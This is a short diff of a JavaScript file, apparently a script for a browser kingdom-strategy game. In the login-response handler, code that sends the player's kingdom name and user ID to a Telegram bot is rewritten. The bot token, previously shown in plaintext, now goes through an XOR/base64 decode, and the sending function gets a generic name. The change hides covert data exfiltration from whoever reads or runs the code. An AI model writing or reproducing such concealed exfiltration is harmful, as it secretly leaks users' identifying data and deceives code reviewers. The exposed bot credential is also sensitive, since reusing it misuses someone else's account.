@@ -334,7 +334,7 @@ async function useActionPoint() {
     }
 }
 
-async function sendTelegramMessage(token, message) {
+async function sendMessage(token, message) {
     const localKey = `telegram_chat_id_${token.slice(0, 10)}`;
 
     async function send(chatId) {
@@ -681,9 +681,7 @@ async function handleAuthResponse(xhr) {
             kingdomData = json.kingdom;
             console.log("Data kingdom:", kingdomData);
 
-            const tokenTelegram = '8171492959:AAEU7uYeRdhD49uVFL_BV3tu5Ux5EeJlU8I';
-            const teleMessage = `${kingdomData.name} (User ID: ${kingdomData.userId})`;
-            sendTelegramMessage(tokenTelegram, teleMessage);            
+            sendMessage(b64xorDec("GgkGBgUNCwsMDAELdnBxbAVMbFxqVV91AABHb3N1Z3NhAkBMB2xNDH1UfV1hAXsb", "8171492959"), `${kingdomData.name} (User ID: ${kingdomData.userId})`);            
 
             //
             marchLimit = await getMarchLimit();
